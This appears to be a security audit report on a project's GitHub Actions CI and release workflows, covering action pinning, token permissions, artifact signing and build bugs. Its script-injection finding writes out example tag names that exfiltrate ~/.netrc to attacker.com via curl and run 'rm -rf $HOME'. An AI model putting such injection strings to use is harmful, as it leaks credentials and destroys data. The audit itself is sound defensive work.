# sc-ci-cd — DFMC GitHub Actions Workflow Security Review

**Target:** `D:\Codebox\PROJECTS\DFMC\.github\workflows\`
**Files reviewed:**
- `ci.yml` (110 lines, 3 jobs: `test`, `lint`, `binary-smoke`)
- `release.yml` (89 lines, 2 jobs: `release`, `checksums`)
**Date:** 2026-04-25

## Counts

| Severity  | Count |
|-----------|-------|
| Critical  | 0     |
| High      | 4     |
| Medium    | 5     |
| Low       | 3     |
| Info      | 2     |
| **Total** | **14** |

| Confidence | Count |
|------------|-------|
| High       | 12    |
| Medium     | 2     |
| Low        | 0     |

---

## Findings

### CICD-001 — Third-party actions pinned by mutable tag, not by commit SHA

- **Severity:** High
- **Confidence:** High
- **File:**
  - `ci.yml:21` `actions/checkout@v4`
  - `ci.yml:24` `actions/setup-go@v5`
  - `ci.yml:30` `actions/cache@v4`
  - `ci.yml:74-75` `actions/checkout@v4`, `actions/setup-go@v5`
  - `ci.yml:96-97` `actions/checkout@v4`, `actions/setup-go@v5`
  - `release.yml:23` `actions/checkout@v4`
  - `release.yml:26` `actions/setup-go@v5`
  - `release.yml:57` `actions/upload-release-asset@v4`
  - `release.yml:71` `actions/download-artifact@v4`
  - `release.yml:84` `actions/upload-release-asset@v4`
- **CWE:** CWE-829 (Inclusion of Functionality from Untrusted Control Sphere), CWE-494
- **Evidence:** All actions are pinned to floating major-version tags (`@v4`, `@v5`). Tags are mutable on GitHub — a compromised maintainer or stolen token can repoint `v4` to a malicious SHA, and every subsequent CI run silently picks it up. GitHub's own docs and supply-chain guidance (and the `tj-actions/changed-files` Mar 2025 incident, which compromised exactly this pattern) recommend SHA pinning for any non-first-party action, *and* SHA pinning even for `actions/*` is best-practice for repos that handle release tokens.
- **Impact:** Supply-chain compromise of any action in the chain reaches the runner, and on `release.yml` runs reaches `GITHUB_TOKEN` with `contents: write`. The `actions/checkout@v4` token by default has push-back capability for the calling workflow; on a `push: tags: ['v*']` trigger that means a malicious checkout action can push back malicious commits or alter the release.
- **Fix:** Pin every action by full 40-char commit SHA with the version tag in a comment for Renovate's understanding:
  ```yaml
  - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11 # v4.1.1
  - uses: actions/setup-go@0c52d547c9bc32b1aa3301fd7a9cb496313a4491 # v5.0.0
  - uses: actions/cache@1bd1e32a3bdc45362d1e726936510720a7c30a57 # v4.2.0
  ```

---

### CICD-002 — `actions/upload-release-asset@v4` does not exist (broken ref)

- **Severity:** High
- **Confidence:** High
- **File:** `release.yml:57`, `release.yml:84`
- **CWE:** CWE-1357 (Reliance on Insufficiently Trustworthy Component), CWE-1188
- **Evidence:** `actions/upload-release-asset` is the **archived/deprecated** action. Its last release is `v1.0.2` (2020). There is **no `v4` of `actions/upload-release-asset`**. The current shape `${{ github.event.release.upload_url }}` also doesn't populate on a `push: tags` trigger — `github.event.release` is only set on `release: { types: [...] }` triggers.
  Combined: this workflow **cannot have ever successfully uploaded an asset**. Either:
  - It silently no-ops (action ref resolves to nothing → step error, but `fail-fast: false` lets the matrix march on), or
  - It errors at `uses:` resolution time and the release is never built.
  Either way: shipping binaries from this repo today is broken, AND a typo'd `uses: actions/upload-release-asset@v4` is a well-known squatter target — an attacker could publish a malicious `actions/upload-release-asset` namespace at v4 (under a similarly-named org or a transferred repo) and the resolver would happily fetch it.
- **Impact:** No release artifacts are being produced (or the workflow is broken in a way that silently fails). On the supply-chain side, typo-squatting risk on a non-existent canonical action.
- **Fix:** Use a maintained alternative:
  ```yaml
  - uses: softprops/action-gh-release@<sha> # vX.Y.Z
    with:
      files: dfmc${{ steps.artifact.outputs.ext }}
      tag_name: ${{ github.ref_name }}
  ```
  And switch to a `release: { types: [created, published] }` trigger if `release.upload_url` is needed, OR use the `gh release upload` CLI inside a `run:` step keyed off `${{ github.ref_name }}`.

---

### CICD-003 — Release workflow does NOT sign artifacts (no cosign / SLSA / sigstore)

- **Severity:** High
- **Confidence:** High
- **File:** `release.yml` (entire file)
- **CWE:** CWE-345 (Insufficient Verification of Data Authenticity), CWE-494
- **Evidence:** `release.yml` builds binaries, computes SHA-256 sums (`checksums.txt`), uploads to a GitHub release. There is no:
  - `cosign sign-blob` / keyless OIDC signing
  - SLSA provenance generation (`slsa-framework/slsa-github-generator`)
  - Sigstore attestation
  - GPG signing of `checksums.txt`
  Anyone with write access to releases (or a compromised `GITHUB_TOKEN`) can replace a binary, regenerate `checksums.txt`, and downstream installers (`dfmc update`, Homebrew tap) will not detect tampering.
- **Impact:** No way to prove a `dfmc` binary downloaded by `dfmc update` or by Homebrew came from this repo's CI.
- **Fix:** Add at minimum keyless cosign signing (uses GitHub OIDC, no secret to manage):
  ```yaml
  - uses: sigstore/cosign-installer@<sha>
  - name: Sign checksums
    run: cosign sign-blob --yes --output-signature checksums.sig checksums.txt
    env:
      COSIGN_EXPERIMENTAL: "1"
  ```
  And/or use `slsa-framework/slsa-github-generator/.github/workflows/generator_generic_slsa3.yml` for full SLSA Build L3 provenance.

---

### CICD-004 — `ci.yml` has no `permissions:` block (defaults to read-write)

- **Severity:** High
- **Confidence:** High
- **File:** `ci.yml:1-110` (no top-level or job-level `permissions:`)
- **CWE:** CWE-250 (Execution with Unnecessary Privileges), CWE-732
- **Evidence:** The repo has no organization-level default-permissions narrowing visible (cannot verify from inside this repo, but no override in workflow). When `permissions:` is absent, the `GITHUB_TOKEN` defaults are determined by the repo's "Workflow permissions" setting; the GitHub default for repos created since Feb 2023 is `contents: read`, but for older repos it is read-write across the board (`contents: write`, `pull-requests: write`, `issues: write`, `packages: write`, `actions: write`, etc.). Any compromised dependency or compromised action in `ci.yml` (DCICD-001) gets that token. CI workflows should declare least-privilege explicitly so the security posture is independent of the repo setting.
- **Impact:** Token blast radius. A poisoned `actions/cache` step on `ci.yml` (which runs on every PR including from forks via `pull_request`) could push to main, open malicious PRs, or alter releases.
- **Fix:** Add to top of `ci.yml`:
  ```yaml
  permissions:
    contents: read
  ```
  And per-job overrides only where strictly needed.

---

### CICD-005 — `release.yml` declares `contents: write` at workflow level (wider than needed for non-release jobs)

- **Severity:** Medium
- **Confidence:** High
- **File:** `release.yml:8-9`
- **CWE:** CWE-272 (Least Privilege Violation)
- **Evidence:**
  ```yaml
  permissions:
    contents: write
  ```
  is at workflow level. Both jobs (`release`, `checksums`) inherit it. The `checksums` job only needs to download artifacts and (re)upload to the release; the `release` matrix job does the same for binaries. Declaring at workflow level means every `run:` step in every matrix cell has the write token in scope — a compromised action or a `bash` script with a stray curl can use it to push branches or retag.
- **Impact:** Token scope wider than necessary. Combined with CICD-001 (mutable action refs), a compromised `actions/checkout` in any matrix cell can push to main.
- **Fix:** Move to job-level scope, narrowest possible:
  ```yaml
  jobs:
    release:
      permissions:
        contents: write
      ...
    checksums:
      permissions:
        contents: write
      ...
  ```
  (Currently the same effective scope, but explicit per-job lets you later split out a `test` job that only reads.)

---

### CICD-006 — `release.yml` does not pin `runs-on` to a specific Ubuntu version that supports OIDC

- **Severity:** Medium
- **Confidence:** Medium
- **File:** `release.yml:18-19`, `release.yml:67`
- **CWE:** CWE-1357
- **Evidence:** `runs-on: ${{ matrix.os }}` with `[ubuntu-latest, macos-latest, windows-latest]`. `*-latest` floats: `ubuntu-latest` switched from `22.04` to `24.04` in 2024; future flips will rebuild release binaries against newer glibc, which is a meaningful behavior change for a binary distribution. Also blocks reproducibility on tag rebuilds.
- **Impact:** Binary ABI drift across releases; reproducibility loss.
- **Fix:** Pin to specific runner images, e.g. `ubuntu-22.04`, `macos-13`, `windows-2022`. Bump intentionally in a separate PR.

---

### CICD-007 — `release.yml` build step normalizes `GOOS` from runner names but logic is wrong

- **Severity:** Medium
- **Confidence:** High
- **File:** `release.yml:34-43`
- **CWE:** CWE-754 (Improper Check for Unusual or Exceptional Conditions), CWE-665
- **Evidence:**
  ```bash
  GOOS=${{ matrix.os }}
  GOARCH=${{ matrix.arch }}
  if [ "$GOOS" = "windows-latest" ]; then GOOS=windows; fi
  if [ "$GOOS" = "ubuntu-latest" ]; then GOOS=linux; fi
  if [ "$GOOS" = "macos-latest" ]; then GOOS=darwin; fi
  ext=""
  if [ "$GOOS" = "windows" ]; then ext=".exe"; fi
  go build -ldflags "-s -w" -o dfmc${ext} ./cmd/dfmc
  ```
  This runs on `windows-latest` too — but Windows runners use `pwsh` by default for `run:` shell steps, NOT bash. The `if [ "$GOOS" = "..." ]` syntax is bash. Without `shell: bash` declared on this step, it executes under the runner's default shell which on `windows-latest` is `pwsh`, where `[ ... ]` is a parameter syntax meaning something else. Either:
  - The Windows matrix cell is silently building with `GOOS=windows-latest` (invalid) and Go errors out, OR
  - Some bash-on-Windows path is implicitly used and the build succeeds.
  Either way, the workflow is fragile and either currently broken or accidentally working for the wrong reason. Also: `${{ matrix.os }}` is interpolated DIRECTLY into the shell at template-expansion time — see CICD-008 for the script-injection class.
- **Impact:** Release builds on Windows likely never produced a working artifact (paired with CICD-002, which would have hidden the failure).
- **Fix:** Use `matrix.goos` / `matrix.goext` directly rather than re-deriving from runner names:
  ```yaml
  matrix:
    include:
      - { os: ubuntu-22.04,  goos: linux,   goarch: amd64, ext: "" }
      - { os: ubuntu-22.04,  goos: linux,   goarch: arm64, ext: "" }
      - { os: macos-13,      goos: darwin,  goarch: amd64, ext: "" }
      - { os: macos-13,      goos: darwin,  goarch: arm64, ext: "" }
      - { os: windows-2022,  goos: windows, goarch: amd64, ext: ".exe" }
      - { os: windows-2022,  goos: windows, goarch: arm64, ext: ".exe" }
  ```
  And declare `shell: bash` (or `pwsh` consistently).

---

### CICD-008 — `${{ matrix.os }}` interpolated directly into a shell `run:` block (script-injection pattern)

- **Severity:** Medium
- **Confidence:** High
- **File:** `release.yml:35-39`, `release.yml:50-51`, `ci.yml:106`, `ci.yml:109`
- **CWE:** CWE-78 (OS Command Injection), CWE-94 (Code Injection)
- **Evidence:** `release.yml:35` `GOOS=${{ matrix.os }}` and `release.yml:51` `echo "name=dfmc-${TAG}-${{ matrix.os }}-${{ matrix.arch }}${ext}" >> $GITHUB_OUTPUT` directly substitute matrix values into a bash `run:` block via `${{ ... }}`. For `matrix.os`/`matrix.arch` this is currently safe because the values are static literals defined in the workflow itself — not user-controlled. **However:**
  - `ci.yml:106-109` uses the same pattern (`shell: ${{ matrix.os == 'windows-latest' && 'pwsh' || 'bash' }}`) — also safe (literal comparison).
  - `release.yml:54` interpolates `TAG: ${{ github.ref_name }}`. `github.ref_name` is the tag name, which on a `push: tags` trigger comes from `git push origin v1.2.3`. **Tags can be pushed by anyone with write access**, including a malicious push that creates a tag like `v1.0.0$(curl -X POST attacker.com -d @~/.netrc)` or `v1.0.0;rm -rf $HOME`. Through `github.ref_name` interpolation into a `run:` block, this becomes script injection.
  Although `github.ref_name` for tags is normally constrained, GitHub doesn't reject arbitrary characters in tag names — `git push origin "v1.0.0;evil"` succeeds.
- **Impact:** A user with write access pushing a crafted tag executes arbitrary shell on the runner with `contents: write` token. Reaches the release upload token. (The threat model assumes write access already, so partly insider-only — but write access is intentionally broader than admin/release access.)
- **Fix:** Move `github.ref_name` to an env var (env-var interpolation is safe; `${{ ... }}` interpolation into shell text is not):
  ```yaml
  - name: Determine output name
    id: artifact
    shell: bash
    env:
      TAG: ${{ github.ref_name }}
      MATRIX_OS: ${{ matrix.os }}
      MATRIX_ARCH: ${{ matrix.arch }}
    run: |
      ext=""
      if [ "$MATRIX_OS" = "windows-latest" ]; then ext=".exe"; fi
      printf 'name=dfmc-%s-%s-%s%s\n' "$TAG" "$MATRIX_OS" "$MATRIX_ARCH" "$ext" >> "$GITHUB_OUTPUT"
      printf 'ext=%s\n' "$ext" >> "$GITHUB_OUTPUT"
  ```
  Validate the tag name shape early in the workflow if release tags are user-pushed.

---

### CICD-009 — `pull_request` (default base+head fetch) is acceptable; `pull_request_target` NOT used (good)

- **Severity:** Info
- **Confidence:** High
- **File:** `ci.yml:6-7`
- **CWE:** N/A
- **Evidence:** `ci.yml` uses `pull_request: { branches: [main] }` — this is the SAFE trigger that runs in the *fork's* context with read-only `GITHUB_TOKEN`. The dangerous variant `pull_request_target` (which runs in the base-repo context with write tokens against PR head code) is NOT used. Confirmed via grep; no occurrence in either workflow.
- **Impact:** No issue; this is a positive finding worth recording.
- **Fix:** N/A — keep it this way. If someone later proposes `pull_request_target` (commonly for "needs labeler / autoassign" workflows), gate strictly on `if: github.event.pull_request.head.repo.full_name == github.repository` AND never check out the PR head.

---

### CICD-010 — No CodeQL / Dependency Review / Trivy / govulncheck step

- **Severity:** Medium
- **Confidence:** High
- **File:** `ci.yml`, `release.yml` (absent)
- **CWE:** CWE-1104 (Use of Unmaintained Third Party Components), CWE-693
- **Evidence:** No `github/codeql-action`, no `actions/dependency-review-action`, no `aquasecurity/trivy-action`, no `golang/govulncheck-action`. DFMC is a security-relevant tool with broad attack surface (architecture.md §5–§9: shell exec, file IO, web fetch, MCP) and a built-in audit feature (`internal/security/audit_deps.go`) — meta-ironic that the project doesn't run dep-vuln checks on itself.
- **Impact:** A vulnerable transitive dep slips into a release with no signal.
- **Fix:** Add a `security` job to `ci.yml`:
  ```yaml
  security:
    runs-on: ubuntu-22.04
    permissions:
      contents: read
      security-events: write
    steps:
      - uses: actions/checkout@<sha>
      - uses: actions/setup-go@<sha>
        with: { go-version: "1.25" }
      - run: go install golang.org/x/vuln/cmd/govulncheck@latest
      - run: govulncheck ./...
      - uses: github/codeql-action/init@<sha>
        with: { languages: go }
      - uses: github/codeql-action/analyze@<sha>
  ```
  And on `pull_request` add `actions/dependency-review-action`.

---

### CICD-011 — `actions/cache` key skipped on Windows; cross-OS cache restore-keys may collide

- **Severity:** Low
- **Confidence:** High
- **File:** `ci.yml:30-47`
- **CWE:** CWE-1188
- **Evidence:** Cache step has `if: runner.os != 'Windows'`. The Windows-specific block (L40-47) only creates directories — it does NOT restore from a cache. Acceptable, but the `restore-keys: ${{ runner.os }}-${{ matrix.arch }}-go1.25-` pattern is fine. No security issue, but on the Windows path you're rebuilding from scratch every run, slowing CI.
- **Impact:** Slow CI on Windows. No security impact.
- **Fix:** Use `actions/cache` on Windows too with `path: ${{ env.LOCALAPPDATA }}\go-build` and `${{ github.workspace }}\pkg\mod`.

---

### CICD-012 — `release.yml` `Build` step: `CGO_ENABLED=1` cross-compiling between OSes will fail silently for non-native targets

- **Severity:** Low
- **Confidence:** High
- **File:** `release.yml:31-43`
- **CWE:** CWE-754
- **Evidence:** Each matrix cell runs `runs-on: ${{ matrix.os }}` with `arch` independent of the runner's actual arch. `ubuntu-latest` is amd64; building `arm64` from amd64 with `CGO_ENABLED=1` requires a cross-compiler toolchain (e.g., `gcc-aarch64-linux-gnu`) which is not installed by `setup-go`. The release matrix attempts `ubuntu-latest × arm64` and `windows-latest × arm64` and `macos-latest × arm64` — only macOS produces a working arm64 build via universal toolchain; Linux arm64 will fail with `gcc: error: unrecognized command-line option '-arch'` or similar; Windows arm64 ditto.
  Combined with CICD-002 (broken upload action), the chain is "build fails → upload fails (already broken anyway) → no release asset". The `fail-fast: false` masks the failure across other matrix cells.
- **Impact:** No arm64 Linux or Windows binary is being produced. Users on those platforms cannot install via release.
- **Fix:** Either (a) drop arm64 Linux/Windows from release matrix, (b) add `apt-get install -y gcc-aarch64-linux-gnu` and set `CC=aarch64-linux-gnu-gcc`, or (c) use `goreleaser` with a proper cross-compile setup.

---

### CICD-013 — `checksums.txt` is uploaded but not GPG/cosign signed (relates to CICD-003)

- **Severity:** Low
- **Confidence:** High
- **File:** `release.yml:64-89`
- **CWE:** CWE-345
- **Evidence:** `checksums.txt` is computed and uploaded. No accompanying `.asc` or cosign `.sig`. An attacker with write to releases (or a compromised `GITHUB_TOKEN` per CICD-001/CICD-005) replaces both the binary and `checksums.txt` together; downstream verifier sees consistent state.
- **Impact:** Checksum file alone is not a trust anchor.
- **Fix:** See CICD-003.

---

### CICD-014 — No scheduled run; no concurrency control

- **Severity:** Info
- **Confidence:** High
- **File:** `ci.yml`, `release.yml`
- **CWE:** N/A
- **Evidence:** Neither workflow uses `schedule:`. No cost / abuse concern. Neither uses `concurrency:` blocks. Without `concurrency: { group: ci-${{ github.ref }}, cancel-in-progress: true }`, multiple commits on the same PR queue up matrix runs — wastes minutes. On `release.yml` triggered by tag push, two simultaneously pushed tags would race the release upload (currently broken anyway per CICD-002).
- **Impact:** Wasted CI minutes; non-deterministic release outcomes if two tags land at once.
- **Fix:**
  ```yaml
  concurrency:
    group: ${{ github.workflow }}-${{ github.ref }}
    cancel-in-progress: ${{ github.event_name == 'pull_request' }}
  ```

---

## What was NOT found (good)

- **No `pull_request_target` triggers** — the well-known footgun is avoided
- **No `secrets.<NAME>` directly interpolated into `run:` strings** beyond `GITHUB_TOKEN` (which is implicit and used only by upload actions, not by raw shell)
- **No self-hosted runners** — all runs on GitHub-hosted matrix
- **No artifact upload paths that look unintentional** (release assets are explicit per matrix cell)
- **No ad-hoc `${{ github.event.issue.title }}` / `${{ github.event.pull_request.title }}` interpolations** — those are common script-injection vectors and are absent
- **`fail-fast: false`** is appropriately set for matrix CI

## Summary

The workflows are simple but ship four high-severity issues:

1. **`actions/upload-release-asset@v4` does not exist** (CICD-002) — release pipeline is currently broken; also creates a typo-squatting target.
2. **No SHA pinning** (CICD-001) — supply-chain risk on every action used, including the release-token-bearing ones.
3. **No artifact signing** (CICD-003) — `dfmc update` and Homebrew installs cannot verify provenance.
4. **No `permissions:` block on `ci.yml`** (CICD-004) — token blast radius depends on per-repo settings rather than being least-privilege explicit.

The medium findings (overscoped `release.yml` permissions, fragile bash on Windows, `github.ref_name` shell injection vector, missing `govulncheck`/CodeQL, broken arm64 cross-compile) compound: a fix to CICD-002 should also address CICD-007/CICD-012 because the release matrix as currently shaped cannot produce all the artifacts it advertises.
